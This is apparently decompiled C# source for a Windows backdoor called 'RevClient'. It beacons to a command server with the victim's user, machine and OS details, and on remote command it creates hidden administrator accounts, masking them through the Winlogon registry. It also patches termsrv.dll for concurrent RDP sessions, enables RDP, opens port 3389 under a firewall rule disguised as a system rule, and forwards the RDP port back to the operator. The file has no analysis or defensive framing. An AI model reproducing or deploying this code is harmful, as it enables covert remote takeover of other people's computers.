using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Management;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using NetFwTypeLib;
using RevClient.Networking;

namespace RevClient
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		[STAThread]
		private static void Main()
		{
			if (!MutexHelper.CreateMutex(Program.m_strMUTEX))
			{
				return;
			}
			try
			{
				string[] array = Encoding.ASCII.GetString(Convert.FromBase64String(Program.AllSettings)).Split(new char[] { ';' });
				if (!string.IsNullOrEmpty(array[3]))
				{
					try
					{
						int num = int.Parse(array[2]);
						if (num > 0)
						{
							Program.m_nMainPort = num;
						}
						num = int.Parse(array[2]);
						if (num > 0)
						{
							Program.m_nMainPort = num;
						}
						Program.m_strHostIP = array[0];
						Program.m_strMstscIP = array[1];
						goto IL_80;
					}
					catch
					{
					}
					goto IL_7B;
					IL_80:
					goto IL_88;
				}
				IL_7B:
				return;
			}
			catch
			{
				return;
			}
			IL_88:
			try
			{
				Program.m_strOS = Environment.MachineName;
				string text = "Unknown OS";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							text = ((ManagementObject)enumerator.Current)["Caption"].ToString();
						}
					}
				}
				text = Regex.Replace(text, "^.*(?=Windows)", "").TrimEnd(new char[0]).TrimStart(new char[0]);
				bool is64BitOperatingSystem = Environment.Is64BitOperatingSystem;
				Program.m_strOS = string.Format("{0} {1} Bit", text, is64BitOperatingSystem ? 64 : 32);
			}
			catch
			{
				Program.m_strOS = "Windows Unkown NT";
			}
			string text2 = "";
			try
			{
				text2 = Environment.UserName + "@" + Environment.MachineName;
			}
			catch
			{
				text2 = "PC@User";
			}
			Program.m_strUserAndPC = Convert.ToBase64String(Encoding.Unicode.GetBytes(text2));
			Program.m_forwarder = new PortForwarder(Program.m_strHostIP, Program.m_nHostPort, Program.m_strMstscIP, Program.m_nMstscPort);
			Program.PrepareForControl();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x0000225C File Offset: 0x0000045C
		private static void PrepareForControl()
		{
			try
			{
				Program.m_sourceClient = new TcpClient();
				for (;;)
				{
					try
					{
						if (!Program.m_sourceClient.Connected)
						{
							Program.m_sourceClient.Connect(Program.m_strHostIP, Program.m_nMainPort);
						}
						else
						{
							Program.m_sourceStream = Program.m_sourceClient.GetStream();
							byte[] bytes = Encoding.Unicode.GetBytes(string.Format("NAT;{0};{1};{2};{3};", new object[]
							{
								Program.m_strUserAndPC,
								Program.m_strOS,
								Program.m_strVersion,
								Program.m_nHostPort
							}));
							Program.m_sourceStream.Write(bytes, 0, bytes.Length);
							byte[] array = new byte[Program.m_sourceClient.ReceiveBufferSize];
							int num = Program.m_sourceStream.Read(array, 0, Program.m_sourceClient.ReceiveBufferSize);
							if (num > 0)
							{
								string[] array2 = Encoding.Unicode.GetString(array, 0, num).Split(new char[] { ';' });
								if (!string.IsNullOrEmpty(array2[3]))
								{
									try
									{
										int num2 = int.Parse(array2[3]);
										if (num2 > 0)
										{
											Program.m_nHostPort = num2;
										}
										goto IL_1E9;
									}
									catch
									{
										goto IL_1E9;
									}
								}
								if (!string.IsNullOrEmpty(array2[2]))
								{
									int num3 = 0;
									try
									{
										num3 = int.Parse(array2[2]);
									}
									catch
									{
										num3 = 0;
									}
									if (num3 == 100 && Program.m_nHostPort > 0)
									{
										Program.m_forwarder.StopServer();
										Task.Factory.StartNew(delegate()
										{
											Program.NewPortForward(Program.m_nHostPort);
										});
										Thread.Sleep(100);
									}
									if (Program.m_forwarder.m_started && num3 == 500)
									{
										Program.m_forwarder.StopServer();
										Thread.Sleep(100);
									}
									if (num3 == 400)
									{
										Program.m_nHostPort = 0;
										if (Program.m_forwarder.m_started)
										{
											Program.m_forwarder.StopServer();
										}
										Thread.Sleep(100);
									}
									if (num3 == 300)
									{
										Program.NewCreateUser(array2[0], array2[1], true);
									}
									if (num3 == 200)
									{
										Program.NewDeleteUser(array2[0], true);
									}
								}
							}
							IL_1E9:
							Program.m_sourceStream.Close();
							Program.m_sourceClient.Close();
						}
					}
					catch
					{
						Program.m_sourceClient.Close();
						Program.m_sourceClient = new TcpClient();
						continue;
					}
					Thread.Sleep(2000);
				}
			}
			catch
			{
				Program.PrepareForControl();
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002500 File Offset: 0x00000700
		private static void NewPortForward(int nHostPort)
		{
			if (!Program.m_forwarder.m_started)
			{
				Program.m_forwarder = new PortForwarder(Program.m_strHostIP, nHostPort, Program.m_strMstscIP, Program.m_nMstscPort);
				Program.m_forwarder.StartServer();
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002534 File Offset: 0x00000734
		private static void NewCreateUser(string user_name, string user_pass, bool isBase64)
		{
			string text = "";
			string text2 = "";
			if (isBase64)
			{
				try
				{
					text = Encoding.Unicode.GetString(Convert.FromBase64String(user_name));
					text2 = Encoding.Unicode.GetString(Convert.FromBase64String(user_pass));
					goto IL_3D;
				}
				catch
				{
					return;
				}
			}
			text = user_name;
			text2 = user_pass;
			IL_3D:
			if (string.IsNullOrEmpty(text) && string.IsNullOrEmpty(text2))
			{
				return;
			}
			try
			{
				DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
				DirectoryEntry directoryEntry2 = directoryEntry.Children.Add(text, "user");
				directoryEntry2.Invoke("SetPassword", new object[] { text2 });
				directoryEntry2.Invoke("Put", new object[] { "Description", "Reverse Database User from .NET" });
				directoryEntry2.CommitChanges();
				DirectoryEntry directoryEntry3 = directoryEntry.Children.Find("Administrators", "group");
				if (directoryEntry3 != null)
				{
					directoryEntry3.Invoke("Add", new object[] { directoryEntry2.Path.ToString() });
				}
			}
			catch (Exception)
			{
				try
				{
					DirectoryEntry directoryEntry4 = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
					DirectoryEntry directoryEntry5 = directoryEntry4.Children.Find(text, "user");
					directoryEntry5.Invoke("SetPassword", new object[] { text2 });
					directoryEntry5.Invoke("Put", new object[] { "Description", "Exception Database User from .NET" });
					directoryEntry5.CommitChanges();
					DirectoryEntry directoryEntry6 = directoryEntry4.Children.Find("Administrators", "group");
					if (directoryEntry6 != null)
					{
						directoryEntry6.Invoke("Add", new object[] { directoryEntry5.Path.ToString() });
					}
				}
				catch
				{
				}
			}
			Program.NewHideUser(text);
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002720 File Offset: 0x00000920
		private static void NewDeleteUser(string user_name, bool isBase64)
		{
			string text = "";
			if (isBase64)
			{
				try
				{
					text = Encoding.Unicode.GetString(Convert.FromBase64String(user_name));
					goto IL_21;
				}
				catch
				{
					return;
				}
			}
			text = user_name;
			IL_21:
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			try
			{
				DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
				DirectoryEntry directoryEntry2 = directoryEntry.Children.Add(text, "user");
				directoryEntry.Children.Remove(directoryEntry2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000027B0 File Offset: 0x000009B0
		private static void NewHideUser(string UserName)
		{
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList");
				if (registryKey == null)
				{
					registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
				}
				if (registryKey != null)
				{
					registryKey.SetValue(UserName, 0, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002810 File Offset: 0x00000A10
		private static bool NewRegexpReplace(byte[] source, byte[] dest, byte[] pattern)
		{
			bool flag = false;
			for (int i = 0; i < source.Length - pattern.Length; i++)
			{
				bool flag2 = true;
				for (int j = 0; j < dest.Length; j++)
				{
					if (source[i + j] != dest[j])
					{
						flag2 = false;
						break;
					}
				}
				if (flag2)
				{
					flag = true;
					Buffer.BlockCopy(pattern, 0, source, i, pattern.Length);
					i += pattern.Length;
				}
			}
			return flag;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x0000286C File Offset: 0x00000A6C
		private static bool NewFirewallAdd(string rulename, string portnumber, bool isIN)
		{
			bool flag = false;
			try
			{
				INetFwRules rules = ((INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwPolicy2"))).Rules;
				Program.NewFirewallDelete(rulename);
				INetFwRule netFwRule = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
				netFwRule.Name = rulename;
				netFwRule.Protocol = 6;
				netFwRule.LocalPorts = portnumber;
				netFwRule.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW;
				if (isIN)
				{
					netFwRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_IN;
				}
				else
				{
					netFwRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT;
				}
				netFwRule.Enabled = true;
				netFwRule.Grouping = "Delivery Optimization";
				netFwRule.Description = "DTC(Distributed Transaction Coordinator) Inbound Rule";
				rules.Add(netFwRule);
			}
			catch
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x0000291C File Offset: 0x00000B1C
		private static bool NewFirewallDelete(string rulename)
		{
			bool flag = false;
			try
			{
				((INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwPolicy2"))).Rules.Remove(rulename);
				flag = true;
			}
			catch
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002964 File Offset: 0x00000B64
		private static void NewConcurrentRDPatcher()
		{
			try
			{
				ServiceController serviceController = new ServiceController("UmRdpService");
				if (serviceController.Status == ServiceControllerStatus.Running)
				{
					serviceController.Stop();
					serviceController.WaitForStatus(ServiceControllerStatus.Stopped);
				}
				ServiceController serviceController2 = new ServiceController("TermService");
				if (serviceController2.Status == ServiceControllerStatus.Running)
				{
					serviceController2.Stop();
					serviceController2.WaitForStatus(ServiceControllerStatus.Stopped);
				}
			}
			catch
			{
			}
			try
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
				string text = folderPath + "\\termsrv.dll";
				string text2 = folderPath + "\\termsrv.dll.pdb";
				string text3 = folderPath + "\\termsrv.dll.log";
				if (!File.Exists(text3))
				{
					File.Copy(text, text3, false);
				}
				Process.Start(new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					FileName = folderPath + "\\takeown.exe",
					Arguments = "/f " + text
				});
				Thread.Sleep(100);
				Process.Start(new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					FileName = folderPath + "\\icacls.exe",
					Arguments = text + " /Grant Administrators:F /C"
				});
				Thread.Sleep(100);
				using (FileStream fileStream = File.OpenRead(text))
				{
					long length = fileStream.Length;
					byte[] array = new byte[length];
					fileStream.Read(array, 0, (int)length);
					byte[] array2 = new byte[] { 57, 129, 60, 6, 0, 0 };
					byte[] array3 = new byte[] { 139, 153, 60, 6, 0, 0 };
					byte[] array4 = new byte[] { 59, 129, 32, 3, 0, 0 };
					byte[] array5 = new byte[] { 187, 1, 0, 0, 0, 199 };
					byte[] array6 = new byte[]
					{
						184, 0, 1, 0, 0, 137, 129, 56, 6, 0,
						0, 144
					};
					byte[] array7 = new byte[]
					{
						184, 0, 1, 0, 0, 137, 129, 32, 3, 0,
						0, 144
					};
					byte[] array8 = new byte[] { 187, 0, 0, 0, 0, 199 };
					bool flag = false;
					if (Program.m_strOS.Contains("Windows 10"))
					{
						flag = Program.NewRegexpReplace(array, array2, array6) | Program.NewRegexpReplace(array, array5, array8) | Program.NewRegexpReplace(array, array3, array6) | Program.NewRegexpReplace(array, array4, array7);
					}
					else if (Program.m_strOS.Contains("Windows 8"))
					{
						flag = Program.NewRegexpReplace(array, array2, array6) | Program.NewRegexpReplace(array, array5, array8) | Program.NewRegexpReplace(array, array3, array6) | Program.NewRegexpReplace(array, array4, array7);
						if (Program.m_strOS.Contains("32 Bit"))
						{
							byte[] array9 = new byte[] { 131, 125, 248, 0, 116, 21 };
							byte[] array10 = new byte[] { 141, 68, 36, 40, 67 };
							byte[] array11 = new byte[] { 131, 125, 248, 0, 235, 21 };
							byte[] array12 = new byte[] { 141, 68, 36, 40, 144 };
							flag |= Program.NewRegexpReplace(array, array9, array11) | Program.NewRegexpReplace(array, array10, array12);
						}
						else
						{
							byte[] array13 = new byte[] { 9, 0, 133, 192, 127, 7, 139, 216 };
							byte[] array14 = new byte[]
							{
								139, 129, 56, 6, 0, 0, 184, 0, 1, 0,
								0, 137, 129, 56, 6, 0, 0, 144
							};
							byte[] array15 = new byte[] { 9, 0, 133, 192, 144, 144, 139, 216 };
							byte[] array16 = new byte[]
							{
								184, 0, 1, 0, 0, 137, 129, 56, 6, 0,
								0, 144, 144, 144, 144, 144, 144, 144
							};
							flag |= Program.NewRegexpReplace(array, array13, array15) | Program.NewRegexpReplace(array, array14, array16);
						}
					}
					else if (Program.m_strOS.Contains("Windows 7"))
					{
						if (Program.m_strOS.Contains("32 Bit"))
						{
							byte[] array17 = new byte[]
							{
								59, 134, 32, 3, 0, 0, 15, 132, byte.MaxValue, 20,
								1, 0, 87, 106, 32, 232
							};
							byte[] array18 = new byte[]
							{
								59, 134, 32, 3, 0, 0, 15, 132, 3, 21,
								1, 0, 87, 106, 32, 232
							};
							byte[] array19 = new byte[]
							{
								133, 224, 254, byte.MaxValue, byte.MaxValue, 67, 80, 199, 133, 224,
								254, byte.MaxValue, byte.MaxValue, 28, 1, 0
							};
							byte[] array20 = new byte[] { 248, 116, 47, 104, 136, 98, 52, 111 };
							byte[] array21 = new byte[] { 248, 116, 47, 104, 64, 106, 52, 111 };
							byte[] array22 = new byte[] { 248, 116, 26, 104, 184, 103, 52, 111 };
							byte[] array23 = new byte[] { 248, 116, 26, 104, 128, 101, 52, 111 };
							byte[] array24 = new byte[]
							{
								184, 0, 1, 0, 0, 144, 137, 134, 32, 3,
								0, 0, 87, 106, 32, 232
							};
							byte[] array25 = new byte[]
							{
								133, 224, 254, byte.MaxValue, byte.MaxValue, 144, 80, 199, 133, 224,
								254, byte.MaxValue, byte.MaxValue, 28, 1, 0
							};
							byte[] array26 = new byte[] { 248, 233, 44, 0, 0, 0, 52, 111 };
							flag = Program.NewRegexpReplace(array, array17, array24) | Program.NewRegexpReplace(array, array18, array24) | Program.NewRegexpReplace(array, array19, array25) | Program.NewRegexpReplace(array, array20, array26) | Program.NewRegexpReplace(array, array21, array26) | Program.NewRegexpReplace(array, array22, array26) | Program.NewRegexpReplace(array, array23, array26);
						}
						else
						{
							byte[] array27 = new byte[]
							{
								139, 135, 56, 6, 0, 0, 57, 135, 60, 6,
								0, 0, 15, 132
							};
							byte[] array28 = new byte[] { 96, 187, 1, 0, 0, 0, 199, 68 };
							byte[] array29 = new byte[] { 80, 1, 118, 27, 72, 141, 21, 73 };
							byte[] array30 = new byte[] { 80, 1, 118, 27, 72, 141, 21, 121 };
							byte[] array31 = new byte[]
							{
								184, 0, 1, 0, 0, 144, 137, 135, 56, 6,
								0, 0, 144, 144, 144, 144, 144, 144
							};
							byte[] array32 = new byte[] { 96, 187, 0, 0, 0, 0, 199, 68 };
							byte[] array33 = new byte[] { 80, 0, 235, 27, 72, 141, 21, 73 };
							byte[] array34 = new byte[] { 80, 0, 235, 27, 72, 141, 21, 121 };
							flag = Program.NewRegexpReplace(array, array27, array31) | Program.NewRegexpReplace(array, array28, array32) | Program.NewRegexpReplace(array, array29, array33) | Program.NewRegexpReplace(array, array30, array34);
						}
					}
					if (flag)
					{
						while (File.Exists(text2))
						{
							File.Delete(text2);
							Thread.Sleep(100);
						}
						using (FileStream fileStream2 = File.Create(text2))
						{
							fileStream2.Write(array, 0, array.Length);
							fileStream2.Flush();
						}
					}
				}
				if (File.Exists(text2))
				{
					while (File.Exists(text))
					{
						Thread.Sleep(100);
						File.Delete(text);
					}
					File.Copy(text2, text, true);
					while (File.Exists(text2))
					{
						Thread.Sleep(100);
						File.Delete(text2);
					}
				}
			}
			catch
			{
			}
			try
			{
				ServiceController serviceController3 = new ServiceController("UmRdpService");
				ServiceController serviceController4 = new ServiceController("TermService");
				serviceController3.Refresh();
				if (serviceController3.Status == ServiceControllerStatus.Stopped)
				{
					serviceController3.Start();
					serviceController3.WaitForStatus(ServiceControllerStatus.Running);
				}
				serviceController4.Refresh();
				if (serviceController4.Status == ServiceControllerStatus.Stopped)
				{
					serviceController4.Start();
					serviceController4.WaitForStatus(ServiceControllerStatus.Running);
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("system\\currentControlSet\\Control\\Terminal Server", true);
				if (registryKey != null)
				{
					registryKey.SetValue("fDenyTSConnections", 0, RegistryValueKind.DWord);
					registryKey.SetValue("fSingleSessionPerUser", 0, RegistryValueKind.DWord);
					registryKey.SetValue("AllowTSConnections", 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
			try
			{
				Program.NewFirewallAdd("AllJoyn Router (TCP-IN)", "3389", true);
			}
			catch
			{
			}
			try
			{
				Thread.Sleep(100);
				Process.Start(new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					FileName = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\gpupdate.exe",
					Arguments = "/force"
				});
			}
			catch
			{
			}
		}

		// Token: 0x04000001 RID: 1
		private static string AllSettings = "MTI3LjAuMC4xOzEyNy4wLjAuMjsyMDg2OzMzODk7";

		// Token: 0x04000002 RID: 2
		private static string m_strVersion = "1.0";

		// Token: 0x04000003 RID: 3
		private static string m_strMUTEX = "ZhengReversePC";

		// Token: 0x04000004 RID: 4
		private static int m_nHostPort = 0;

		// Token: 0x04000005 RID: 5
		private static int m_nMstscPort = 3389;

		// Token: 0x04000006 RID: 6
		private static int m_nMainPort = 0;

		// Token: 0x04000007 RID: 7
		private static string m_strHostIP = "";

		// Token: 0x04000008 RID: 8
		private static string m_strMstscIP = "127.0.0.2";

		// Token: 0x04000009 RID: 9
		private static string m_strUserAndPC = "PC@User";

		// Token: 0x0400000A RID: 10
		private static string m_strOS = "Windows Unkown NT";

		// Token: 0x0400000B RID: 11
		public static PortForwarder m_forwarder = null;

		// Token: 0x0400000C RID: 12
		private static NetworkStream m_sourceStream;

		// Token: 0x0400000D RID: 13
		private static TcpClient m_sourceClient = null;
	}
}
